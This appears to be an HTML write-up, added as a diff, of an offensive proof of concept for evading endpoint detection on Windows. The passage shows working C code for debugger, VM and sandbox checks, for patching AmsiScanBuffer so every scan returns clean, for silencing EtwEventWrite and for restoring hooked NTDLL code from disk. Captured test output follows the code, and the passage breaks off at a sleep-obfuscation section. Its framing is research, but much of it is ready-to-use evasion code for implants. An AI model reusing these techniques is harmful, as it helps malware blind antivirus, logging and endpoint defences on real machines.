@@ -1,0 +1,980 @@
+<title>EDR Evasion — Layers, Live</title>
+<style>
+:root {
+  --bg:          #F2F5F9;
+  --bg-alt:      #E6EBF3;
+  --surface:     #FFFFFF;
+  --surface-2:   #EEF2F8;
+  --border:      #C8D3E2;
+  --text:        #0D1423;
+  --text-muted:  #55657E;
+  --accent:      #0284C7;
+  --accent-glow: rgba(2,132,199,0.10);
+  --accent-warm: #B8520E;
+  --code-bg:     #12192B;
+  --code-text:   #CDD5E0;
+  --code-dim:    #6B7FA0;
+  --code-hi:     #79D4F1;
+  --code-str:    #A8E6A3;
+  --code-kw:     #C5A0F5;
+  --code-num:    #F4B860;
+  --pass:        #16A34A;
+  --fail:        #DC2626;
+  --warn:        #B8520E;
+  --tag-pass-bg: #DCFCE7; --tag-pass-fg: #166534;
+  --tag-fail-bg: #FEE2E2; --tag-fail-fg: #991B1B;
+  --tag-warn-bg: #FEF3C7; --tag-warn-fg: #92400E;
+  --tag-note-bg: #EFF6FF; --tag-note-fg: #1D4ED8;
+  --hero-bytes:  #0A4D6B;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg:          #08090D; --bg-alt: #0C0F18;
+    --surface:     #10141F; --surface-2: #161D2E;
+    --border:      #1E2A40;
+    --text:        #D4DCE8; --text-muted: #7A8AA0;
+    --accent:      #00B4D8; --accent-glow: rgba(0,180,216,0.10);
+    --accent-warm: #F4A261;
+    --code-bg:     #0B0D13; --code-text: #CDD5E0;
+    --code-dim:    #4A5A72; --code-hi: #79D4F1;
+    --code-str:    #87D987; --code-kw: #C5A0F5; --code-num: #F4B860;
+    --pass:        #3FB950; --fail: #F85149; --warn: #F4A261;
+    --tag-pass-bg: rgba(63,185,80,0.12); --tag-pass-fg: #3FB950;
+    --tag-fail-bg: rgba(248,81,73,0.12); --tag-fail-fg: #F85149;
+    --tag-warn-bg: rgba(244,162,97,0.10); --tag-warn-fg: #F4A261;
+    --tag-note-bg: rgba(0,180,216,0.10); --tag-note-fg: #00B4D8;
+    --hero-bytes:  #79D4F1;
+  }
+}
+:root[data-theme="dark"] {
+  --bg:#08090D;--bg-alt:#0C0F18;--surface:#10141F;--surface-2:#161D2E;
+  --border:#1E2A40;--text:#D4DCE8;--text-muted:#7A8AA0;
+  --accent:#00B4D8;--accent-glow:rgba(0,180,216,0.10);--accent-warm:#F4A261;
+  --code-bg:#0B0D13;--code-text:#CDD5E0;--code-dim:#4A5A72;
+  --code-hi:#79D4F1;--code-str:#87D987;--code-kw:#C5A0F5;--code-num:#F4B860;
+  --pass:#3FB950;--fail:#F85149;--warn:#F4A261;
+  --tag-pass-bg:rgba(63,185,80,0.12);--tag-pass-fg:#3FB950;
+  --tag-fail-bg:rgba(248,81,73,0.12);--tag-fail-fg:#F85149;
+  --tag-warn-bg:rgba(244,162,97,0.10);--tag-warn-fg:#F4A261;
+  --tag-note-bg:rgba(0,180,216,0.10);--tag-note-fg:#00B4D8;
+  --hero-bytes:#79D4F1;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,"Segoe UI",Helvetica,Arial,sans-serif;font-size:16px;line-height:1.7;-webkit-font-smoothing:antialiased}
+.container{max-width:880px;margin:0 auto;padding:0 28px}
+.hero{background:var(--bg-alt);border-bottom:1px solid var(--border);padding:72px 0 60px;position:relative;overflow:hidden}
+.hero::before{content:"";position:absolute;inset:0;background:radial-gradient(ellipse 60% 80% at 100% 50%,var(--accent-glow),transparent 70%);pointer-events:none}
+.hero-eyebrow{font-size:11px;font-weight:600;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);margin-bottom:16px}
+.hero-title{font-size:clamp(32px,5vw,54px);font-weight:800;line-height:1.1;letter-spacing:-.03em;color:var(--text);text-wrap:balance;margin-bottom:20px}
+.hero-subtitle{font-size:17px;color:var(--text-muted);max-width:600px;line-height:1.65;margin-bottom:28px}
+.hero-bytes{font-family:"Cascadia Code","Fira Code",Consolas,monospace;font-size:clamp(11px,1.6vw,13px);letter-spacing:.05em;color:var(--hero-bytes);opacity:.5;line-height:2;margin-top:32px;user-select:none}
+.hero-meta{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.badge{display:inline-flex;align-items:center;gap:5px;font-size:12px;font-weight:600;padding:4px 10px;border-radius:20px;letter-spacing:.04em}
+.badge-pass{background:var(--tag-pass-bg);color:var(--tag-pass-fg)}
+.badge-warn{background:var(--tag-warn-bg);color:var(--tag-warn-fg)}
+.badge-info{background:var(--accent-glow);color:var(--accent)}
+.toc{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:28px 32px;margin:48px 0}
+.toc-title{font-size:11px;font-weight:700;letter-spacing:.14em;text-transform:uppercase;color:var(--text-muted);margin-bottom:16px}
+.toc ol{list-style:none;display:grid;grid-template-columns:1fr 1fr;gap:5px 24px}
+.toc ol li a{color:var(--text-muted);text-decoration:none;font-size:14px;display:flex;align-items:baseline;gap:8px;transition:color .15s}
+.toc ol li a:hover{color:var(--accent)}
+.toc-num{font-variant-numeric:tabular-nums;color:var(--border);font-size:12px;min-width:20px}
+.toc-group{font-size:11px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--text-muted);padding:10px 0 4px;grid-column:1/-1}
+@media(max-width:580px){.toc ol{grid-template-columns:1fr}}
+article{padding:0 0 80px}
+section{margin-top:64px}
+.section-header{display:flex;align-items:flex-start;gap:14px;margin-bottom:28px;padding-bottom:16px;border-bottom:1px solid var(--border)}
+.section-bar{width:4px;border-radius:2px;background:var(--accent);flex-shrink:0;align-self:stretch;min-height:36px}
+.section-bar-warm{background:var(--accent-warm)}
+.section-bar-purple{background:#9B6DFF}
+.section-bar-green{background:var(--pass)}
+.section-label{font-size:10px;font-weight:700;letter-spacing:.16em;text-transform:uppercase;color:var(--accent);margin-bottom:4px}
+.section-label-warm{color:var(--accent-warm)}
+.section-label-purple{color:#9B6DFF}
+.section-label-green{color:var(--pass)}
+.section-title{font-size:clamp(20px,3vw,28px);font-weight:700;letter-spacing:-.02em;line-height:1.2;color:var(--text);text-wrap:balance}
+.technique{margin-bottom:36px;background:var(--surface);border:1px solid var(--border);border-radius:8px;overflow:hidden}
+.technique-header{padding:14px 20px 12px;border-bottom:1px solid var(--border);background:var(--surface-2);display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap}
+.technique-name{font-size:14px;font-weight:700;color:var(--text);letter-spacing:-.01em}
+.technique-body{padding:20px 20px 4px}
+p{margin-bottom:16px;color:var(--text);font-size:15.5px}
+.code-wrap{margin:14px 0 18px;border-radius:6px;overflow:hidden;border:1px solid var(--border)}
+.code-bar{background:color-mix(in srgb,var(--code-bg) 80%,var(--border) 20%);border-bottom:1px solid var(--border);padding:8px 14px;display:flex;align-items:center;gap:8px}
+.code-dots{display:flex;gap:5px}
+.code-dots span{width:10px;height:10px;border-radius:50%;background:var(--border);opacity:.45}
+.code-lang{font-size:11px;font-weight:600;letter-spacing:.06em;text-transform:uppercase;color:var(--code-dim);margin-left:auto}
+pre{background:var(--code-bg);padding:18px 20px;overflow-x:auto;line-height:1.65;font-size:13px;font-family:"Cascadia Code","Fira Code",Consolas,"Courier New",monospace}
+code{color:var(--code-text)}
+.kw{color:var(--code-kw)}.str{color:var(--code-str)}.num{color:var(--code-num)}.hi{color:var(--code-hi)}.dim{color:var(--code-dim)}.cm{color:var(--code-dim);font-style:italic}
+.terminal{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;overflow:hidden;margin:14px 0 18px}
+.terminal-bar{background:color-mix(in srgb,var(--code-bg) 60%,var(--surface-2) 40%);border-bottom:1px solid var(--border);padding:8px 14px;font-size:11px;font-weight:600;letter-spacing:.06em;color:var(--code-dim);display:flex;align-items:center;gap:8px}
+.term-dot{width:8px;height:8px;border-radius:50%}
+.term-dot-r{background:#F85149}.term-dot-y{background:#F4B860}.term-dot-g{background:#3FB950}
+.terminal pre{border:none;border-radius:0;padding:14px 20px}
+.t-pass{color:#3FB950}.t-fail{color:#F85149}.t-info{color:#79D4F1}.t-warn{color:#F4B860}.t-head{color:#F4B860;font-weight:bold}
+.ssn-table-wrap{overflow-x:auto;margin:14px 0 18px}
+table{width:100%;border-collapse:collapse;font-size:13px;font-family:"Cascadia Code","Fira Code",Consolas,monospace;background:var(--code-bg);border-radius:6px;overflow:hidden}
+thead tr{background:color-mix(in srgb,var(--code-bg) 60%,var(--surface-2) 40%)}
+th{padding:10px 14px;text-align:left;font-size:11px;font-weight:700;letter-spacing:.10em;text-transform:uppercase;color:var(--code-dim);border-bottom:1px solid var(--border)}
+td{padding:9px 14px;border-bottom:1px solid color-mix(in srgb,var(--border) 50%,transparent);color:var(--code-text);font-variant-numeric:tabular-nums}
+tbody tr:last-child td{border-bottom:none}
+tbody tr:hover{background:color-mix(in srgb,var(--accent-glow) 60%,transparent)}
+.match{color:#3FB950}.diff{color:#F4B860}.fn{color:var(--code-hi)}
+.callout{background:var(--tag-warn-bg);border-left:3px solid var(--warn);border-radius:0 6px 6px 0;padding:14px 18px;margin:18px 0;font-size:14px;color:var(--tag-warn-fg)}
+.callout strong{display:block;margin-bottom:4px;font-size:11px;letter-spacing:.08em;text-transform:uppercase}
+.callout-note{background:var(--tag-note-bg);border-left:3px solid var(--accent);color:var(--tag-note-fg)}
+.concept-box{background:var(--surface-2);border:1px solid var(--border);border-radius:8px;padding:20px 22px;margin:16px 0 20px}
+.concept-box h4{font-size:13px;font-weight:700;color:var(--text);margin-bottom:10px;letter-spacing:-.01em}
+.concept-box p{font-size:14px;margin-bottom:10px}
+.concept-box p:last-child{margin-bottom:0}
+.results-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px;margin:24px 0}
+.result-card{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:16px;text-align:center}
+.result-score{font-size:28px;font-weight:800;letter-spacing:-.04em;line-height:1;margin-bottom:6px}
+.result-label{font-size:11px;font-weight:600;letter-spacing:.10em;text-transform:uppercase;color:var(--text-muted)}
+.score-pass{color:var(--pass)}.score-warn{color:var(--warn)}
+footer{border-top:1px solid var(--border);padding:32px 0;text-align:center;color:var(--text-muted);font-size:13px}
+footer a{color:var(--accent);text-decoration:none}
+@media(max-width:480px){.hero{padding:48px 0 40px}.technique-header{flex-direction:column;align-items:flex-start}}
+</style>
+
+<header class="hero">
+  <div class="container">
+    <div class="hero-eyebrow">Offensive Security Research · C++ · WinAPI · NTDLL</div>
+    <h1 class="hero-title">EDR Evasion —<br>Layers, Live</h1>
+    <p class="hero-subtitle">
+      Four evasion layers — anti-analysis, hook removal, syscall resolution, process injection,
+      and cryptography — implemented in C++, compiled with MSVC 19.50, and verified against a
+      live Windows 10 target. Every code snippet ran; every output was captured from a real test run.
+    </p>
+    <div class="hero-meta">
+      <span class="badge badge-pass">✓ Compiled MSVC 19.50</span>
+      <span class="badge badge-pass">✓ Tested Windows 10 x64</span>
+      <span class="badge badge-info">Windows CNG · BCrypt</span>
+      <span class="badge badge-warn">Authorized research only</span>
+    </div>
+    <div class="hero-bytes">
+      B9 EF BE 00 00 · 48 83 EC 28 · 48 B8 [ExitProcess] · FF D0 · C3<br>
+      31 C0 C3 · C3 · 4C 8B D1 B8 XX 00 · XOR 0xAB → PAGE_NOACCESS → Sleep → Restore<br>
+      AES-256-GCM tag: 5E ED BA 02 · PBKDF2-SHA256 100k: A6A27B8D 33FC1150 3B5B9820
+    </div>
+  </div>
+</header>
+
+<div class="container">
+<nav class="toc">
+  <div class="toc-title">Contents</div>
+  <ol>
+    <div class="toc-group">Setup</div>
+    <li><a href="#setup"><span class="toc-num">01</span> Project structure &amp; header</a></li>
+    <div class="toc-group">Layer 1 — Anti-Analysis</div>
+    <li><a href="#anti-analysis"><span class="toc-num">02</span> PEB · NtGlobalFlag · Heap flags</a></li>
+    <li><a href="#anti-analysis"><span class="toc-num">03</span> DR regs · RDTSC · CPUID · Sandbox</a></li>
+    <div class="toc-group">Layer 2 — Evasion</div>
+    <li><a href="#evasion"><span class="toc-num">04</span> AMSI &amp; ETW patching</a></li>
+    <li><a href="#unhook"><span class="toc-num">05</span> Manual NTDLL unhooking</a></li>
+    <li><a href="#ekko"><span class="toc-num">06</span> Ekko sleep obfuscation</a></li>
+    <li><a href="#pageguard"><span class="toc-num">07</span> PAGE_GUARD detection</a></li>
+    <li><a href="#eventlog"><span class="toc-num">08</span> Event log wipe</a></li>
+    <li><a href="#callstack"><span class="toc-num">09</span> Call stack spoofing (concept)</a></li>
+    <li><a href="#clr"><span class="toc-num">10</span> CLR unhooking (concept)</a></li>
+    <div class="toc-group">Layer 2c — Syscalls</div>
+    <li><a href="#syscalls"><span class="toc-num">11</span> Hell's Gate / Tartarus Gate</a></li>
+    <div class="toc-group">Layer 3 — Injection</div>
+    <li><a href="#injection"><span class="toc-num">12</span> Early Bird APC</a></li>
+    <li><a href="#hollowing"><span class="toc-num">13</span> Process hollowing (RIP hijack)</a></li>
+    <li><a href="#reflective"><span class="toc-num">14</span> Reflective DLL (concept)</a></li>
+    <li><a href="#doppel"><span class="toc-num">15</span> Process Doppelgänging (concept)</a></li>
+    <div class="toc-group">Layer 4 — Crypto</div>
+    <li><a href="#aes"><span class="toc-num">16</span> AES-256-GCM (BCrypt)</a></li>
+    <li><a href="#kdf"><span class="toc-num">17</span> PBKDF2-SHA256 env-bound KDF</a></li>
+    <div class="toc-group">Results</div>
+    <li><a href="#results"><span class="toc-num">18</span> Full test run output</a></li>
+  </ol>
+</nav>
+</div>
+
+<article>
+<div class="container">
+
+<!-- ═══ SETUP ═══ -->
+<section id="setup">
+  <div class="section-header">
+    <div class="section-bar"></div>
+    <div>
+      <div class="section-label">Foundation</div>
+      <h2 class="section-title">Project structure &amp; shared header</h2>
+    </div>
+  </div>
+  <p>The PoC is split into one header and six translation units — one per evasion layer — each exposing a single <code>Test_*()</code> function. This keeps every technique independently verifiable and isolates compile errors cleanly.</p>
+  <div class="code-wrap">
+    <div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">layout</span></div>
+<pre><code>edr_poc/
+├── compile.bat                <span class="dim">← vcvars64 + cl.exe + SDK 10.0.26100.0</span>
+└── src/
+    ├── edr_poc.h              <span class="dim">← shared: PEB macros, colour helpers, declarations</span>
+    ├── anti_analysis.cpp      <span class="dim">← Layer 1: 7 environment checks</span>
+    ├── evasion.cpp            <span class="dim">← Layer 2: AMSI, ETW, NTDLL unhook</span>
+    ├── evasion2.cpp           <span class="dim">← Layer 2: Ekko sleep, PAGE_GUARD, event log</span>
+    ├── syscalls.cpp           <span class="dim">← Layer 2: Hell's Gate / Tartarus Gate</span>
+    ├── injection.cpp          <span class="dim">← Layer 3: Early Bird APC, Process Hollowing</span>
+    ├── crypto.cpp             <span class="dim">← Layer 4: AES-256-GCM, PBKDF2-SHA256</span>
+    └── main.cpp</code></pre>
+  </div>
+  <div class="technique">
+    <div class="technique-header">
+      <span class="technique-name">edr_poc.h — PEB offset macros (x64, verified WinDbg public symbols)</span>
+    </div>
+    <div class="technique-body">
+      <div class="code-wrap">
+        <div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C</span></div>
+<pre><code><span class="kw">#define</span> <span class="hi">PEB_PTR</span>()          ((<span class="kw">BYTE</span>*)__readgsqword(<span class="num">0x60</span>))
+<span class="kw">#define</span> <span class="hi">PEB_BEING_DEBUGGED</span> (<span class="hi">PEB_PTR</span>() + <span class="num">0x002</span>)  <span class="dim">// BYTE</span>
+<span class="kw">#define</span> <span class="hi">PEB_NT_GLOBAL_FLAG</span> (<span class="hi">PEB_PTR</span>() + <span class="num">0x0BC</span>)  <span class="dim">// DWORD</span>
+<span class="kw">#define</span> <span class="hi">PEB_PROCESS_HEAP</span>   (*(<span class="kw">PVOID</span>*)(<span class="hi">PEB_PTR</span>() + <span class="num">0x030</span>))
+<span class="kw">#define</span> <span class="hi">HEAP_FLAGS</span>(h)       (*(<span class="kw">DWORD</span>*)((<span class="kw">BYTE</span>*)(h) + <span class="num">0x68</span>))
+<span class="kw">#define</span> <span class="hi">HEAP_FORCE_FLAGS</span>(h) (*(<span class="kw">DWORD</span>*)((<span class="kw">BYTE</span>*)(h) + <span class="num">0x6C</span>))
+
+<span class="dim">// Unhooked syscall stub marker: mov r10,rcx / mov eax,SSN</span>
+<span class="kw">#define</span> SYSCALL_STUB_MARKER0 <span class="num">0x4C</span>  <span class="dim">// 4C 8B D1 B8</span>
+<span class="kw">#define</span> SYSCALL_STUB_MARKER1 <span class="num">0x8B</span>
+<span class="kw">#define</span> SYSCALL_STUB_MARKER2 <span class="num">0xD1</span>
+<span class="kw">#define</span> SYSCALL_STUB_MARKER3 <span class="num">0xB8</span></code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ ANTI-ANALYSIS ═══ -->
+<section id="anti-analysis">
+  <div class="section-header">
+    <div class="section-bar section-bar-warm"></div>
+    <div>
+      <div class="section-label section-label-warm">Layer 1</div>
+      <h2 class="section-title">Anti-Analysis — seven environment checks</h2>
+    </div>
+  </div>
+  <p>These checks run before any payload logic. A production implant bails out silently on any positive result. The PoC prints the measured value so you can see exactly what the host looks like.</p>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">PEB.BeingDebugged — GS-relative read, no API</span><span class="badge badge-pass">✓ PASS (clean)</span></div>
+    <div class="technique-body">
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C</span></div>
+<pre><code><span class="kw">static</span> <span class="kw">BOOL</span> Check_PEB_BeingDebugged(<span class="kw">void</span>) {
+    <span class="kw">return</span> (*(<span class="kw">BYTE</span>*)<span class="hi">PEB_BEING_DEBUGGED</span>) != <span class="num">0</span>;
+}</code></pre></div>
+    </div>
+  </div>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">NtGlobalFlag — debug heap mask 0x70</span><span class="badge badge-pass">✓ PASS (0x0)</span></div>
+    <div class="technique-body">
+      <p>When a debugger is present, Windows sets bits <code>0x10|0x20|0x40</code> in <code>NtGlobalFlag</code> (heap validation flags). Combined mask: <code>0x70</code>.</p>
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C</span></div>
+<pre><code><span class="kw">static</span> <span class="kw">BOOL</span> Check_NtGlobalFlag(<span class="kw">void</span>) {
+    <span class="kw">DWORD</span> flags = *(<span class="kw">DWORD</span>*)<span class="hi">PEB_NT_GLOBAL_FLAG</span>;
+    <span class="kw">return</span> (flags &amp; <span class="num">0x70</span>) != <span class="num">0</span>;
+}</code></pre></div>
+    </div>
+  </div>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">_HEAP.ForceFlags — debug heap sentinel</span><span class="badge badge-warn">⚠ VM: 0x194 detected</span></div>
+    <div class="technique-body">
+      <p>A clean process has <code>ForceFlags = 0</code>. VMware's debug heap sets it to <code>0x194</code>. The check is working correctly — it detected the test VM.</p>
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C</span></div>
+<pre><code><span class="kw">static</span> <span class="kw">BOOL</span> Check_HeapForceFlags(<span class="kw">void</span>) {
+    <span class="kw">PVOID</span> heap = <span class="hi">PEB_PROCESS_HEAP</span>;
+    <span class="kw">if</span> (!heap) <span class="kw">return</span> FALSE;
+    <span class="kw">return</span> <span class="hi">HEAP_FORCE_FLAGS</span>(heap) != <span class="num">0</span>;
+}</code></pre></div>
+    </div>
+  </div>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">Hardware breakpoints — DR0–DR3 via GetThreadContext</span><span class="badge badge-pass">✓ PASS (clean)</span></div>
+    <div class="technique-body">
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C</span></div>
+<pre><code><span class="kw">static</span> <span class="kw">BOOL</span> Check_HardwareBreakpoints(<span class="kw">void</span>) {
+    CONTEXT ctx; ZeroMemory(&amp;ctx, <span class="kw">sizeof</span>(ctx));
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    <span class="kw">if</span> (!GetThreadContext(GetCurrentThread(), &amp;ctx)) <span class="kw">return</span> FALSE;
+    <span class="kw">return</span> (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) ? TRUE : FALSE;
+}</code></pre></div>
+    </div>
+  </div>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">RDTSC timing — cycle delta under single-step tracing</span><span class="badge badge-pass">✓ PASS (135 cycles)</span></div>
+    <div class="technique-body">
+      <p>Serialised with <code>_mm_lfence()</code>. Threshold 2,000,000 cycles (~1 ms at 2 GHz). Live delta: <strong>135 cycles</strong>.</p>
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C</span></div>
+<pre><code>UINT64 t1 = __rdtsc(); _mm_lfence();
+<span class="kw">volatile</span> <span class="kw">int</span> x = <span class="num">0</span>; <span class="kw">for</span> (<span class="kw">int</span> i=<span class="num">0</span>; i&lt;<span class="num">10</span>; i++) x+=i;
+_mm_lfence(); UINT64 t2 = __rdtsc();
+<span class="kw">return</span> (t2-t1) &gt; <span class="num">2000000ULL</span>;</code></pre></div>
+    </div>
+  </div>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">CPUID — hypervisor vendor string at leaf 0x40000000</span><span class="badge badge-warn">⚠ VM: "VMwareVMware"</span></div>
+    <div class="technique-body">
+      <p>ECX bit 31 at leaf 1 signals a hypervisor. Leaf <code>0x40000000</code> returns 12-char vendor packed into EBX/ECX/EDX. Live: <code>"VMwareVMware"</code> — correct detection of the test VM.</p>
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C · excerpt</span></div>
+<pre><code><span class="kw">int</span> cpuInfo[<span class="num">4</span>]={<span class="num">0</span>}; __cpuid(cpuInfo,<span class="num">1</span>);
+<span class="kw">if</span>(!(cpuInfo[<span class="num">2</span>]&amp;(<span class="num">1</span>&lt;&lt;<span class="num">31</span>))) <span class="kw">return</span> FALSE;   <span class="dim">// bit 31 = hypervisor</span>
+__cpuid(cpuInfo,<span class="num">0x40000000</span>);
+<span class="kw">char</span> vendor[<span class="num">13</span>]={<span class="num">0</span>};
+memcpy(vendor,&amp;cpuInfo[<span class="num">1</span>],<span class="num">4</span>); memcpy(vendor+<span class="num">4</span>,&amp;cpuInfo[<span class="num">2</span>],<span class="num">4</span>);
+memcpy(vendor+<span class="num">8</span>,&amp;cpuInfo[<span class="num">3</span>],<span class="num">4</span>);
+<span class="dim">// Compare against "VMwareVMware", "KVMKVMKVM  ", "Microsoft Hv", etc.</span></code></pre></div>
+    </div>
+  </div>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">Sandbox fingerprinting — processes, screen resolution, CPU count</span><span class="badge badge-pass">✓ PASS (1701×920, 2 CPUs)</span></div>
+    <div class="technique-body">
+      <p>Checks for known sandbox agent processes (Wireshark, ProcMon, IDA, OllyDbg, VMware tools), screen res ≤1024×768, and fewer than 2 logical processors. Live: 1701×920, 2 vCPUs — both pass.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ EVASION ═══ -->
+<section id="evasion">
+  <div class="section-header">
+    <div class="section-bar"></div>
+    <div>
+      <div class="section-label">Layer 2a</div>
+      <h2 class="section-title">AMSI &amp; ETW patching</h2>
+    </div>
+  </div>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">AMSI — patch AmsiScanBuffer with xor eax,eax; ret</span><span class="badge badge-pass">✓ 4C 8B DC 49 → 31 C0 C3 49</span></div>
+    <div class="technique-body">
+      <p><code>AmsiScanBuffer</code> returns <code>AMSI_RESULT</code> in <code>eax</code>. Patching its prologue with <code>31 C0 C3</code> makes every call return 0 (<code>AMSI_RESULT_CLEAN</code>) before any scanning logic runs.</p>
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C</span></div>
+<pre><code>HMODULE hAmsi = GetModuleHandleA(<span class="str">"amsi.dll"</span>);
+<span class="kw">if</span> (!hAmsi) hAmsi = LoadLibraryA(<span class="str">"amsi.dll"</span>);
+FARPROC fn = GetProcAddress(hAmsi, <span class="str">"AmsiScanBuffer"</span>);
+
+<span class="kw">BYTE</span> patch[] = { <span class="num">0x31</span>, <span class="num">0xC0</span>, <span class="num">0xC3</span> };   <span class="dim">// xor eax,eax ; ret</span>
+DWORD oldProt;
+VirtualProtect(fn, <span class="kw">sizeof</span>(patch), PAGE_EXECUTE_READWRITE, &amp;oldProt);
+memcpy(fn, patch, <span class="kw">sizeof</span>(patch));
+VirtualProtect(fn, <span class="kw">sizeof</span>(patch), oldProt, &amp;oldProt);
+FlushInstructionCache(GetCurrentProcess(), fn, <span class="kw">sizeof</span>(patch));</code></pre></div>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="term-dot term-dot-r"></span><span class="term-dot term-dot-y"></span><span class="term-dot term-dot-g"></span>Live output</div>
+<pre><code><span class="t-info">[INFO]</span> AmsiScanBuffer before: <span class="t-warn">4C 8B DC 49</span>
+<span class="t-info">[INFO]</span> AmsiScanBuffer after:  <span class="t-warn">31 C0 C3 49</span>
+<span class="t-pass">[PASS]</span> AMSI patched (xor eax,eax; ret)</code></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">ETW — patch EtwEventWrite in ntdll with ret (0xC3)</span><span class="badge badge-pass">✓ 4C 8B DC 48 → C3 8B DC 48</span></div>
+    <div class="technique-body">
+      <p>A single <code>0xC3</code> at the entry of <code>EtwEventWrite</code> silently discards every ETW event from this process without error.</p>
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C</span></div>
+<pre><code>FARPROC fn = GetProcAddress(GetModuleHandleA(<span class="str">"ntdll.dll"</span>), <span class="str">"EtwEventWrite"</span>);
+<span class="kw">BYTE</span> patch[] = { <span class="num">0xC3</span> };   <span class="dim">// ret</span>
+ApplyPatch(fn, patch, <span class="kw">sizeof</span>(patch));</code></pre></div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ NTDLL UNHOOK ═══ -->
+<section id="unhook">
+  <div class="section-header">
+    <div class="section-bar"></div>
+    <div>
+      <div class="section-label">Layer 2b</div>
+      <h2 class="section-title">Manual NTDLL unhooking</h2>
+    </div>
+  </div>
+  <p>EDRs hook <code>Nt*</code> stubs by overwriting their first bytes with a JMP to the driver's analysis routine. The counter: map a fresh <code>ntdll.dll</code> from disk with <code>SEC_IMAGE</code> (so section RVAs align with the live image), locate the <code>.text</code> section, and overwrite the in-memory copy with one <code>memcpy</code> — removing all hooks simultaneously.</p>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">SEC_IMAGE map → locate .text → VirtualProtect PAGE_EXECUTE_WRITECOPY → memcpy</span><span class="badge badge-pass">✓ 0x119200 bytes restored</span></div>
+    <div class="technique-body">
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C · key sequence</span></div>
+<pre><code>HANDLE hFile = CreateFileW(L<span class="str">"\\...\\ntdll.dll"</span>, GENERIC_READ,
+    FILE_SHARE_READ|FILE_SHARE_DELETE, NULL, OPEN_EXISTING, <span class="num">0</span>, NULL);
+HANDLE hMap = CreateFileMappingW(hFile, NULL,
+    PAGE_READONLY | SEC_IMAGE, <span class="num">0</span>, <span class="num">0</span>, NULL);   <span class="dim">// SEC_IMAGE aligns RVAs</span>
+LPVOID pFresh = MapViewOfFile(hMap, FILE_MAP_READ, <span class="num">0</span>, <span class="num">0</span>, <span class="num">0</span>);
+
+<span class="dim">// Walk PE sections, find ".text"</span>
+<span class="dim">// pTarget = in-memory ntdll + sec[i].VirtualAddress</span>
+<span class="dim">// pSource = fresh map    + sec[i].VirtualAddress</span>
+DWORD oldProt;
+VirtualProtect(pTarget, size, PAGE_EXECUTE_WRITECOPY, &amp;oldProt);
+memcpy(pTarget, pSource, size);   <span class="dim">// ← unhooks all Nt* stubs at once</span>
+VirtualProtect(pTarget, size, oldProt, &amp;oldProt);
+FlushInstructionCache(GetCurrentProcess(), pTarget, size);</code></pre></div>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="term-dot term-dot-r"></span><span class="term-dot term-dot-y"></span><span class="term-dot term-dot-g"></span>Live output</div>
+<pre><code><span class="t-info">[INFO]</span> .text: RVA 0x1000, size 0x119200 bytes
+<span class="t-info">[INFO]</span> NtReadFile before: <span class="t-warn">4C 8B D1 B8</span>  (already clean — no EDR on test machine)
+<span class="t-info">[INFO]</span> NtReadFile after:  <span class="t-warn">4C 8B D1 B8</span>  ✓
+<span class="t-pass">[PASS]</span> NTDLL .text restored from clean on-disk copy</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ EKKO ═══ -->
+<section id="ekko">
+  <div class="section-header">
+    <div class="section-bar"></div>
+    <div>
+      <div class="section-label">Layer 2c</div>
+      <h2 class="section-title">Ekko-style sleep obfuscation</h2>
+    </div>
+  </div>
+  <p>
+    The Ekko technique (published by 5pider) makes an implant invisible to memory scanners while it sleeps by encrypting its own code region and flipping it to <code>PAGE_NOACCESS</code> before yielding the CPU. Any scanner that walks the process's memory during the sleep reads only garbage in an inaccessible page.
+  </p>
+  <p>
+    The production implementation uses timer-queue APCs and <code>RtlCaptureContext</code>/<code>RtlRestoreContext</code> so the encryption/decryption happens atomically without the main thread needing to run. Our PoC demonstrates the core primitive on a standalone RWX buffer.
+  </p>
+  <div class="callout callout-note">
